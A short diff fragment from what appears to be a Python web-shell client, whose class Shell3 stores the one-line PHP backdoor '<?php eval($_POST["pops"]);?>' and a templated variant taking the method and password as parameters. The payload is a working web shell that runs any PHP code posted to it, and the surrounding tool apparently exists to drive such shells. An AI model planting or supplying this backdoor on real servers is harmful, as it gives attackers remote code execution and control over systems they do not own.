@@ -3,7 +3,7 @@ from webshell.shellbase import EvalShellBase
 from lib import request
 '''
 <?php eval($_{method}[{password}]);
-'''.replace('\n',' ')
+'''
 
 class Shell3(EvalShellBase):
     CONTENT = '''<?php eval($_POST["pops"]);?>'''
